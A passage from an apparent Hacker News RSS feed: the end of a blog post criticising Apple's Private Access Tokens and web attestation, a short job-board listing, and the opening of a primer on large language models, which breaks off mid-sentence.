<p>Of course, Google isn't the first to think of this, but in fact they're not even the first to ship it. Apple already developed &amp; deployed an extremely similar system last year, now integrated into MacOS 13, iOS 16 &amp; Safari, called "<a href="https://developer.apple.com/news/?id=huqjyh7k">Private Access Tokens</a>":</p>
<blockquote>
<p>Private Access Tokens are powerful tools that prove when HTTP requests are coming from legitimate devices without disclosing someone's identity.</p>
</blockquote>
<p>The focus here is primarily on removing captchas, and as such it's been integrated into Cloudflare (discussed <a href="https://blog.cloudflare.com/eliminating-captchas-on-iphones-and-macs-using-new-standard/">here</a>) and Fastly (<a href="https://www.fastly.com/blog/private-access-tokens-stepping-into-the-privacy-respecting-captcha-less">here</a>) as a mechanism for recognizing 'real' clients without needing other captcha mechanisms.</p>
<p>Fundamentally though, it's exactly the same concept: a way that web servers can demand your device prove it is a sufficiently 'legitimate' device before browsing the web.</p>
<h2 id="how-do-private-access-tokens-work"><a href="#how-do-private-access-tokens-work" aria-label="how do private access tokens work permalink"></a>How do Private Access Tokens work?</h2>
<p>The mechanism is a fairly simple exchange over HTTP, handled by built-in browser APIs, which in turn integrate with operating system components to confirm that the browser &amp; OS are 'legitimate' (the exact definition of that is left to the attester - i.e. Apple).</p>
<p>The flow looks like this:</p>
<ol>
<li>A browser makes an HTTP request from a web server.</li>
<li>
<p>The web server refuses the request, and returns an HTTP 401 response with a <code>PrivateToken</code> challenge:</p>
<div data-language="text">
      <pre><code>HTTP/1.1 401 Unauthorized
WWW-Authenticate:
    PrivateToken challenge=&lt;base64 challenge data&gt;,
        token-key=&lt;base64 public-key&gt;</code></pre>
      </div>
<p><em>(Newlines added for readability)</em></p>
</li>
<li>The browser recognizes this, and sends parts of the challenge, in addition to verified details of your device provided by the OS, to an attester (e.g. Apple).</li>
<li>The attester verifies your device is real &amp; unmodified (depends on the device, but both Android &amp; iOS have existing ways to check this) and works with a token issuer (somebody trusted by the origin &amp; that trusts the attester, e.g. Cloudflare/Fastly) to return a signed token, proving that your device has been verified as legitimate.</li>
<li>
<p>The browser resends the request, with the signed token in their <code>Authorization</code> header:</p>
<div data-language="text">
      <pre><code>GET /protected-content HTTP/1.1
Host: example.com
Authorization: PrivateToken token=&lt;signed token&gt;</code></pre>
      </div>
</li>
<li>The server now knows that the client has been verified by a trusted provider (but nothing more) and can treat the client differently on that basis.</li>
</ol>
<p>This all happens on Apple devices today when using Safari, any time a service using this (such as Fastly &amp; Cloudflare) is concerned about the legitimacy of your requests.</p>
<p>The privacy protections in here appear fairly strong (I'm not an expert on this, but that's a very clear goal of the proposal and the separation of the origin/issuer/attester flow) but the core issue from Web Environment Integrity remains: your treatment on the web depends on whether Apple says your device, OS &amp; browser configuration are legitimate &amp; acceptable.</p>
<h2 id="how-bad-is-this"><a href="#how-bad-is-this" aria-label="how bad is this permalink"></a>How bad is this?</h2>
<p>This feature is largely bad for the web and the industry generally, like all attestation (see below).</p>
<p>That said, it's not as dangerous as the Google proposal, simply because Safari isn't the dominant browser. Right now, Safari has around 20% market share in browsers (25% on mobile, and 15% on desktop), while Chrome is comfortably above 60% everywhere, with Chromium more generally (Brave, Edge, Opera, Samsung Internet, etc) about 10% above that.</p>
<p>With Safari providing this, it can be used by some providers, but nobody can block or behave differently with unattested clients. Similarly, Safari can't usefully use this to tighten the screws on users - while they could refuse to attest old OS versions or browsers, it wouldn't make a significant impact on users (they might see statistically more CAPTCHAs, but little else).</p>
<p>Chrome's usage is a larger concern. With 70+% of web clients using Chromium, this would become a major part of the web very quickly. With both Web Environment Integrity &amp; Private Access Tokens, 90% of web clients would potentially be attested, and the "oh, you're not attested, let's treat you suspiciously" pressure could ramp up quickly.</p>
<h2 id="why-is-attestation-bad-generally"><a href="#why-is-attestation-bad-generally" aria-label="why is attestation bad generally permalink"></a>Why is attestation bad generally?</h2>
<p>This has been <a href="https://arstechnica.com/gadgets/2023/07/googles-web-integrity-api-sounds-like-drm-for-the-web/">covered</a> <a href="https://gabrielsieben.tech/2022/07/29/remote-assertion-is-coming-back-how-much-freedom-will-it-take/">extensively</a> elsewhere, so I won't dig into it too deeply, but as a quick summary:</p>
<ul>
<li>Attestation means you can only use approved clients, which is terrible for competition and innovation (sorry, it's now impossible to make a new browser or OS!) particularly for open-source, community &amp; smaller indie efforts that are consistently excluded from these mechanisms. If attestation was around in the days of IE6, it would've been a major roadblock in the rise of Firefox &amp; Chrome.</li>
<li>Attestation blocks users' control of their own devices, by design. A key goal is that users using modified software should not be attested as legitimate. I would like to be able to browse the web on my rooted Android phone please. There's no way any fully user-modifiable OS or hardware can ever be attested in the way these proposals intend.</li>
<li>Attestation opens dangerous doors that allow the approved providers to freely tighten the rules later. "Sorry, we only attest devices during their 2 year official support window", and "Sorry, we don't attest browsers with ad-block extensions installed" are both perfectly plausible and thoroughly problematic next steps.</li>
</ul>
<p>Proponents would argue that none of this applies to the Web Environment Integrity proposal, as it suggests 'holdbacks', i.e. refusing attestation a small percentage of times to make blocking based on attestation impossible. I suspect business pressures will make that unworkable in practice (there's already <a href="https://github.com/RupertBenWiser/Web-Environment-Integrity/issues/5">strong industry pushback</a> from a closely involved F5 / Shape Security representative) and it's notable that Google's existing Android Play Integrity attestation does <em>not</em> do this.</p>
<p>Free usage of different clients &amp; servers on the web is what has built the open web, and is a large part of why it's so successful. Attestation breaks this by design.</p>
<p>All of this has already played out on Android, where you technically <em>can</em> create and run your OS, and Android distributions like <a href="https://lineageos.org/">LineageOS</a> are perfectly functional, but attestation features mean that this implies the constant risk of key apps (like your bank!) blocking you as suspicious.</p>
<p>Fundamentally, attestation is anti-competitive. Blocking competition between different Android versions is already problematic. Blocking competition for both browsers &amp; OSs on the web would be catastrophic.</p>
<h2 id="shit"><a href="#shit" aria-label="shit permalink"></a>Shit</h2>
<p>Quite.</p>
<p>If you're concerned about all this, you might also be interested in the <a href="https://github.com/antifraudcg/proposals/issues">other proposals</a> from the Anti-Fraud Community Group, discussing various other potential web 'features' along the same lines.</p>
<p>Fraud &amp; bots on the web are a real problem, and discussion on ways to defend against that is totally reasonable, and often very valuable! It's a hard problem. That said, this has to be carefully balanced against the health of the web itself. Blocking competition, hamstringing open-source and the open web, and removing all user control over their own devices is not a reasonable tradeoff.</p>
<p>Have thoughts or comments? Get in touch <a href="https://twitter.com/pimterry">on Twitter</a>, <a href="https://toot.cafe/@pimterry">on Mastodon</a> or <a href="https://httptoolkit.com/contact/">directly</a>.</p>
<p><strong>Want to understand how this all works up close? Try intercepting, exploring &amp; modifying your web traffic with <a href="https://httptoolkit.com/">HTTP Toolkit</a> now</strong>.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Show HN: PyCareer ‚Äì Exclusive Python Job Board (507 pts)]]></title>
            <link>https://www.pycareer.io/</link>
            <guid>36861908</guid>
            <pubDate>Tue, 25 Jul 2023 13:29:19 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.pycareer.io/">https://www.pycareer.io/</a>, See on <a href="https://news.ycombinator.com/item?id=36861908">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><h2>üêç PyCareer</h2><p>Python jobs from all over the web!</p><p>ü§ñ Collected with AI daily!</p><p>üöÄ 79 total job sources scraped daily!</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[What We Know About LLMs (314 pts)]]></title>
            <link>https://willthompson.name/what-we-know-about-llms-primer</link>
            <guid>36860992</guid>
            <pubDate>Tue, 25 Jul 2023 11:57:27 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://willthompson.name/what-we-know-about-llms-primer">https://willthompson.name/what-we-know-about-llms-primer</a>, See on <a href="https://news.ycombinator.com/item?id=36860992">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><article id="block-what-we-know-about-llms-primer"><p><span><span>Will Thompson</span></span></p><p><span><span><span><span><span>@</span>July 23, 2023</span></span></span><span> </span></span></p><ul id="block-cf06de2e26d446f38d1b8f2444827acd"><li><a href="#13524c3f617649df8311bba44f426b26"><p><span><span>Intro</span></span></p></a></li><li><a href="#f707d2def7494b129f38a0f8cf72c3f5"><p><span><span>What We Mean By ‚ÄúLLM‚Äù</span></span></p></a></li><li><a href="#1e1db7bf46744ae9996a606fe76b8cdb"><p><span><span>What We Knew About LLMs (From Before)</span></span></p></a></li><li><a href="#89b981fe82344f2e9ca11e2c8b5b3958"><p><span><span>Generalization üß†</span></span></p></a></li><li><a href="#85b3ec4df96e4c878c1a6db6357269a2"><p><span><span>Power Laws in Performance üö®</span></span></p></a></li><li><a href="#eae32bda8e6f423da00cbd16d0ed325f"><p><span><span>Research Trends üìà</span></span></p></a></li><li><a href="#a72fc0eed97f4d01940b386423b0ff5c"><p><span><span>InstructGPT ü§ñ</span></span></p></a></li><li><a href="#c32b3388754146de815fc07ed8fbc2e1"><p><span><span>Steerability ‚õ∑Ô∏è &amp; Alignment üßòüèΩ‚Äç‚ôÄÔ∏è</span></span></p></a></li><li><a href="#63e48dd8cd8a4d46be4029ff8a031e47"><p><span><span>1. Instruction Fine-Tuning  üéõÔ∏è</span></span></p></a></li><li><a href="#44942fd81c604e8fa5b14272b008ba0b"><p><span><span>2. RLHF üíé</span></span></p></a></li><li><a href="#e66065b5c05343109388237954ef3311"><p><span><span>Conclusion: LLMs as Reasoning Agents ü§î</span></span></p></a></li><li><a href="#f1502945b85a48f684e5d7f6d842f07c"><p><span><span>Citation</span></span></p></a></li></ul><h2 id="block-13524c3f617649df8311bba44f426b26"><span id="13524c3f617649df8311bba44f426b26"></span><span><span>Intro</span></span></h2><div id="block-e6aa957fa7064aad95329c7de0339c27"><p><span><span></span><img alt="Crypto VCs &amp; ‚Äùbuilders‚Äù making a hard left into AI (Borrowed from ML Twitter)" sizes="100vw" srcset="https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2F5b7f470c-e1fc-42a6-b868-8f685fe02778%2FUntitled.png&amp;w=640&amp;q=80 640w, https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2F5b7f470c-e1fc-42a6-b868-8f685fe02778%2FUntitled.png&amp;w=750&amp;q=80 750w, https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2F5b7f470c-e1fc-42a6-b868-8f685fe02778%2FUntitled.png&amp;w=828&amp;q=80 828w, https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2F5b7f470c-e1fc-42a6-b868-8f685fe02778%2FUntitled.png&amp;w=1080&amp;q=80 1080w, https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2F5b7f470c-e1fc-42a6-b868-8f685fe02778%2FUntitled.png&amp;w=1200&amp;q=80 1200w, https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2F5b7f470c-e1fc-42a6-b868-8f685fe02778%2FUntitled.png&amp;w=1920&amp;q=80 1920w, https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2F5b7f470c-e1fc-42a6-b868-8f685fe02778%2FUntitled.png&amp;w=2048&amp;q=80 2048w, https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2F5b7f470c-e1fc-42a6-b868-8f685fe02778%2FUntitled.png&amp;w=3840&amp;q=80 3840w" src="https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2F5b7f470c-e1fc-42a6-b868-8f685fe02778%2FUntitled.png&amp;w=3840&amp;q=80" decoding="async" data-nimg="responsive" loading="lazy" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></span></p><figcaption><span><span><em>Crypto VCs &amp; ‚Äùbuilders‚Äù making a hard left into AI (Borrowed from ML Twitter)</em></span></span></figcaption></div><p><span><span>We are in the midst of yet another AI Summer where the possible futures enumerated in the Press seem both equally amazing and terrifying. LLMs are predicted to both create immeasurable wealth for society as well as potentially compete with (or deprecate?) knowledge workers. While bond markets are trying to read the tea leaves on future Fed rate hikes, equity markets are bullish on all things AI. Many companies are rapidly adopting some form of AI play in order to appease shareholder FOMO. A large percentage of YC cohort members are, unsurprisingly, generative AI startups now. All the ‚ÄúMAANG‚Äùs (whatever they are called these days) seem to have some form of giant LLM they are building now. It‚Äôs as though crypto was forgotten overnight; the public imagination appears singularly captivated with what possibilities AI may usher forth. </span></span></p><p><span><span>The madness of crowds aside, it is worth reflecting on what we concretely know about LLMs at this point in time and how these insights sparked the latest AI fervor. This will help put into perspective the relevance of current research efforts and the possibilities that abound.</span></span></p><h2 id="block-f707d2def7494b129f38a0f8cf72c3f5"><span id="f707d2def7494b129f38a0f8cf72c3f5"></span><span><span>What We Mean By ‚ÄúLLM‚Äù</span></span></h2><p><span><span>When people say ‚ÄúLarge Language Models‚Äù, they typically are referring to a type of deep learning architecture called a Transformer. Transformers are models that work with sequence data (e.g. text, images, time series, etc) and are part of a larger family of models called  </span><span><a href="https://d2l.ai/chapter_recurrent-neural-networks/sequence.html" target="_blank" rel="noopener noreferrer">Sequence Models</a></span><span>. Many Sequence Models can also be thought of as Language Models, or models that learn a probability distribution of the next word/pixel/value in a sequence: </span><span><!--$--><span id=""><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo stretchy="false">(</mo><msub><mi>w</mi><mi>t</mi></msub><mi mathvariant="normal">‚à£</mi><msub><mi>w</mi><mrow><mi>t</mi><mo>‚àí</mo><mn>1</mn></mrow></msub><mo separator="true">,</mo><msub><mi>w</mi><mrow><mi>t</mi><mo>‚àí</mo><mn>2</mn></mrow></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">p(w_t|w_{t-1},w_{t-2},...)</annotation></semantics></math></span></span></span><!--/$--></span><span>. </span></span></p><div id="block-8ea137637f6c495898ef4406cd64c76b"><p><span><span></span><img alt="Figure 9.7.1. in this illustrated guide&nbsp;" sizes="100vw" srcset="https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2F6ad86efb-513e-4e57-b6fd-0243da1034e7%2FUntitled.png&amp;w=640&amp;q=80 640w, https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2F6ad86efb-513e-4e57-b6fd-0243da1034e7%2FUntitled.png&amp;w=750&amp;q=80 750w, https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2F6ad86efb-513e-4e57-b6fd-0243da1034e7%2FUntitled.png&amp;w=828&amp;q=80 828w, https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2F6ad86efb-513e-4e57-b6fd-0243da1034e7%2FUntitled.png&amp;w=1080&amp;q=80 1080w, https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2F6ad86efb-513e-4e57-b6fd-0243da1034e7%2FUntitled.png&amp;w=1200&amp;q=80 1200w, https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2F6ad86efb-513e-4e57-b6fd-0243da1034e7%2FUntitled.png&amp;w=1920&amp;q=80 1920w, https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2F6ad86efb-513e-4e57-b6fd-0243da1034e7%2FUntitled.png&amp;w=2048&amp;q=80 2048w, https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2F6ad86efb-513e-4e57-b6fd-0243da1034e7%2FUntitled.png&amp;w=3840&amp;q=80 3840w" src="https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2F6ad86efb-513e-4e57-b6fd-0243da1034e7%2FUntitled.png&amp;w=3840&amp;q=80" decoding="async" data-nimg="responsive" loading="lazy" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></span></p><figcaption><span><span>Figure 9.7.1. in this illustrated guide&nbsp;</span><span><a href="https://d2l.ai/chapter_recurrent-modern/seq2seq.html" target="_blank" rel="noopener noreferrer">here</a></span><span>. This is a type of encoder-decoder RNN. Notice the left-to-right causal ordering. Each token is processed sequentially.</span></span></figcaption></div><p><span><span>What differentiates the Transformer from its predecessors is it‚Äôs ability to learn the contextual relationship of values within a sequence through a mechanism called (self-) </span><span><a href="https://lilianweng.github.io/posts/2018-06-24-attention/" target="_blank" rel="noopener noreferrer">Attention</a></span><span>. Unlike the Recurrent Neural Network (</span><span><a href="https://stanford.edu/~shervine/teaching/cs-230/cheatsheet-recurrent-neural-networks" target="_blank" rel="noopener noreferrer">RNN</a></span><span>), where the arrow of time is preserved by processing each time step serially within a sequence, Transformers can read the entire sequence at once and learn to ‚Äúpay attention to‚Äù only the values that came earlier in time (via ‚Äúmasking‚Äù). This allows for faster training times (i.e. the whole sequence in parallel) and larger model parameter sizes. Transformers were once considered ‚Äúlarge‚Äù when they were ~ 100MM+ parameters; today, published models are </span><span><strong>~500B-1T parameters</strong></span><span> in size. Anecdotally, several papers have reported a major inflection point in Transformer behavior around ~</span><span><strong>100B+</strong></span><span> parameters. (Note: these models are generally too large to fit into a single GPU and require the model to be broken apart and distributed across multiple nodes).</span></span></p><div id="block-fd7c5af78fd946f7b25873b190a09312"><p><span><span></span><img alt="From Jay Alammar‚Äôs popular " srcset="https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2Fb1fe8e95-631d-4c6a-9cde-edb751bfcf96%2FUntitled.png&amp;w=640&amp;q=80 1x, https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2Fb1fe8e95-631d-4c6a-9cde-edb751bfcf96%2FUntitled.png&amp;w=1080&amp;q=80 2x" src="https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2Fb1fe8e95-631d-4c6a-9cde-edb751bfcf96%2FUntitled.png&amp;w=1080&amp;q=80" decoding="async" data-nimg="intrinsic" loading="lazy" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></span></p><figcaption><span><span>From Jay Alammar‚Äôs popular </span><span><a href="http://jalammar.github.io/illustrated-transformer/" target="_blank" rel="noopener noreferrer">‚ÄúThe Illustrated Transformer‚Äù</a></span><span> blog post.  A context window is used to read in K tokens simultaneously in order to understand the relative meaning of words in a sentence. This is opposed to the RNN (see above), which technically can be thought as having an infinite context window (an observation by Karpathy), although each word must be processed serially. RNNs have a history of requiring more clever architecture tweaks to overcome their innate inability to connect long-term dependencies in a sentence, which is actually where the original (hierarchical) attention mechanism was born out of necessity.</span></span></figcaption></div><p><span><span>Transformers can be generally categorized into one of three categories: ‚Äú</span><span><strong>encoder only</strong></span><span>‚Äù (a la </span><span><a href="https://arxiv.org/abs/1810.04805" target="_blank" rel="noopener noreferrer">BERT</a></span><span>); ‚Äú</span><span><strong>decoder only</strong></span><span>‚Äù (a la </span><span><a href="https://openai.com/gpt-4" target="_blank" rel="noopener noreferrer">GPT</a></span><span>); and having an ‚Äú</span><span><strong>encoder-decoder</strong></span><span>‚Äù architecture (a la </span><span><a href="https://arxiv.org/abs/1910.10683" target="_blank" rel="noopener noreferrer">T5</a></span><span>). Although all of these architectures can be rigged for a broad range of tasks (e.g. classification, translation, etc),  </span><span><a href="https://huggingface.co/learn/nlp-course/chapter1/5?fw=pt" target="_blank" rel="noopener noreferrer">encoders</a></span><span> are thought to be useful for tasks where the entire sequence needs to be understood (such as sentiment classification), whereas </span><span><a href="https://huggingface.co/learn/nlp-course/chapter1/6" target="_blank" rel="noopener noreferrer">decoders</a></span><span> are thought to be useful for tasks where text needs to be completed (such as completing a sentence). Encoder-decoder architectures can be applied to a variety of problems, but are most famously associated with language translation.</span></span></p><p><span><span><em>Decoder-only Transformers such as ChatGPT &amp; GPT-4 are the class of LLM that are ubiquitously referring to as ‚Äúgenerative AI‚Äù.</em></span></span></p><h2 id="block-1e1db7bf46744ae9996a606fe76b8cdb"><span id="1e1db7bf46744ae9996a606fe76b8cdb"></span><span><span>What We Knew About LLMs (From Before)</span></span></h2><p><span><span>Since the debut of the </span><span><a href="https://arxiv.org/abs/1706.03762" target="_blank" rel="noopener noreferrer">OG Transformer paper</a></span><span> ~6 years ago, we‚Äôve gleamed a couple interesting properties about this class of models.</span></span></p><h2 id="block-89b981fe82344f2e9ca11e2c8b5b3958"><span id="89b981fe82344f2e9ca11e2c8b5b3958"></span><span><span>Generalization üß†</span></span></h2><p><span><span>We learned that the the same trained LLM could figure out how to complete many different tasks with only being shown a few examples for each task; that is, </span><span><a href="https://arxiv.org/abs/2005.14165" target="_blank" rel="noopener noreferrer">LLMs are few-shot learners</a></span><span>. This meant that whatever the LLM had learned about language in it‚Äôs (pre-)training task (which is usually predicting the next word in a sequence), it could translate to new tasks without needing to be trained from scratch to do said task (and with only a handful of examples). </span></span></p><p><span><span>That is, we discovered LLMs‚Äô capacity to </span><span><em>generalize</em></span><span>.</span></span></p><div id="block-15f5462f917748768b78dc4b30517aac"><p><span><span></span><img alt="Figure 1.2 in " sizes="100vw" srcset="https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2F1e48b4d2-1a1d-4839-bc7d-5f8665056ab0%2FScreenshot_2023-06-13_at_6.02.22_PM.png&amp;w=640&amp;q=80 640w, https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2F1e48b4d2-1a1d-4839-bc7d-5f8665056ab0%2FScreenshot_2023-06-13_at_6.02.22_PM.png&amp;w=750&amp;q=80 750w, https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2F1e48b4d2-1a1d-4839-bc7d-5f8665056ab0%2FScreenshot_2023-06-13_at_6.02.22_PM.png&amp;w=828&amp;q=80 828w, https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2F1e48b4d2-1a1d-4839-bc7d-5f8665056ab0%2FScreenshot_2023-06-13_at_6.02.22_PM.png&amp;w=1080&amp;q=80 1080w, https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2F1e48b4d2-1a1d-4839-bc7d-5f8665056ab0%2FScreenshot_2023-06-13_at_6.02.22_PM.png&amp;w=1200&amp;q=80 1200w, https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2F1e48b4d2-1a1d-4839-bc7d-5f8665056ab0%2FScreenshot_2023-06-13_at_6.02.22_PM.png&amp;w=1920&amp;q=80 1920w, https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2F1e48b4d2-1a1d-4839-bc7d-5f8665056ab0%2FScreenshot_2023-06-13_at_6.02.22_PM.png&amp;w=2048&amp;q=80 2048w, https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2F1e48b4d2-1a1d-4839-bc7d-5f8665056ab0%2FScreenshot_2023-06-13_at_6.02.22_PM.png&amp;w=3840&amp;q=80 3840w" src="https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2F1e48b4d2-1a1d-4839-bc7d-5f8665056ab0%2FScreenshot_2023-06-13_at_6.02.22_PM.png&amp;w=3840&amp;q=80" decoding="async" data-nimg="responsive" loading="lazy" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></span></p><figcaption><span><span>Figure 1.2 in </span><span><a href="https://arxiv.org/pdf/2005.14165.pdf" target="_blank" rel="noopener noreferrer">the GPT-3 paper</a></span><span>. Shows that larger models are better at generalizing to new tasks (especially via ‚Äúin-context learning‚Äù).</span></span></figcaption></div><h2 id="block-85b3ec4df96e4c878c1a6db6357269a2"><span id="85b3ec4df96e4c878c1a6db6357269a2"></span><span><span>Power Laws in Performance üö®</span></span></h2><p><span><span>We also learned that LLMs had </span><span><a href="https://arxiv.org/pdf/2001.08361.pdf" target="_blank" rel="noopener noreferrer">predictable (power law) scaling behavior</a></span><span>. With larger training datasets, models could scale up in parameter size and become more data efficient, ultimately leading to better performance on benchmarks. </span></span></p><p><span><span>Given a dataset size and chosen model size, we can (seemingly magically) predict the performance of the model prior to (pre-)training it.</span></span></p><h2 id="block-eae32bda8e6f423da00cbd16d0ed325f"><span id="eae32bda8e6f423da00cbd16d0ed325f"></span><span><span>Research Trends üìà</span></span></h2><p><span><span>Given these observations, a large research trend in LLMs was</span><span><strong> training progressively larger and larger LLMs</strong></span><span> and measuring their performance on benchmarks (although, some papers such as the</span><span><a href="https://arxiv.org/abs/2103.00020" target="_blank" rel="noopener noreferrer"> CLIP paper</a></span><span> call into question whether benchmark performance actually reflected generalizability, part of a nuanced observation called ‚ÄúThe Cheating Hypothesis‚Äù). This required splitting these models across many GPUs/TPUs (i.e. </span><span><strong>model parallelism</strong></span><span>) due in large part to a model tweak provided from </span><span><a href="https://arxiv.org/abs/1909.08053" target="_blank" rel="noopener noreferrer">the Megatron paper</a></span><span>, </span><span><a href="https://lilianweng.github.io/posts/2021-09-25-train-large/" target="_blank" rel="noopener noreferrer">innovations in model/pipeline sharding</a></span><span>, and packages such as </span><span><a href="https://github.com/microsoft/DeepSpeed" target="_blank" rel="noopener noreferrer">DeepSpeed</a></span><span>. </span><span><a href="https://arxiv.org/abs/2209.05433" target="_blank" rel="noopener noreferrer">Quantization</a></span><span> also reduced the memory and computational footprint of these models. And since the traditional self-attention mechanism at the core of the Transformer is </span><span><!--$--><span id=""><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>N</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(N^2)</annotation></semantics></math></span></span></span><!--/$--></span><span> in space and time complexity,  naturally research into faster mechanisms such as </span><span><a href="https://arxiv.org/abs/2205.14135" target="_blank" rel="noopener noreferrer">Flash Attention</a></span><span> was of considerable interest. Further, innovations like </span><span><a href="https://arxiv.org/pdf/2108.12409.pdf" target="_blank" rel="noopener noreferrer">Alibi</a></span><span> allowed for variable context windows. This opened the door to </span><span><strong>larger context windows </strong></span><span>and is the reason why today‚Äôs LLMs have as large as </span><span><a href="https://www.anthropic.com/index/100k-context-windows" target="_blank" rel="noopener noreferrer">100k token context windows</a></span><span>. </span></span></p><p><span><span>And given the size of these (very large) LLMs, there was interest in how to </span><span><strong>fine-tune them to problems more efficiently</strong></span><span>. Innovation in Parameter-Efficient Fine-Tuning (</span><span><strong>PEFT</strong></span><span>) such as </span><span><a href="https://arxiv.org/pdf/1902.00751.pdf" target="_blank" rel="noopener noreferrer">Adapters</a></span><span> and </span><span><a href="https://arxiv.org/pdf/2106.09685.pdf" target="_blank" rel="noopener noreferrer">LoRA</a></span><span> allowed for faster fine-tuning since there are fewer parameters to adjust in these paradigms. Combined with the advent of 4- and 8-bit </span><span><strong>quantization</strong></span><span>, it‚Äôs now even possible to fine-tune a model on CPU! (note: most models are trained using 16 or 32 bit floats)</span></span></p><p><span><span>[</span><span><strong>Note</strong></span><span>: This is not a comprehensive overview of research trends. For instance, there was considerable research into other areas such as LLMs‚Äô ability to </span><span><a href="https://arxiv.org/abs/2107.06499" target="_blank" rel="noopener noreferrer">regurgitate information</a></span><span>, </span><span><a href="https://arxiv.org/pdf/2104.13733.pdf" target="_blank" rel="noopener noreferrer">adversarial attacks</a></span><span>, and domain specific LLMs such as </span><span><a href="https://arxiv.org/pdf/2107.03374.pdf" target="_blank" rel="noopener noreferrer">Codex</a></span><span> (for writing code) as well as early-stage multimodal LLMs (i.e. Transformers that understand images, text, etc). Further, </span><span><a href="https://arxiv.org/pdf/2112.04426.pdf" target="_blank" rel="noopener noreferrer">RETRO</a></span><span> and 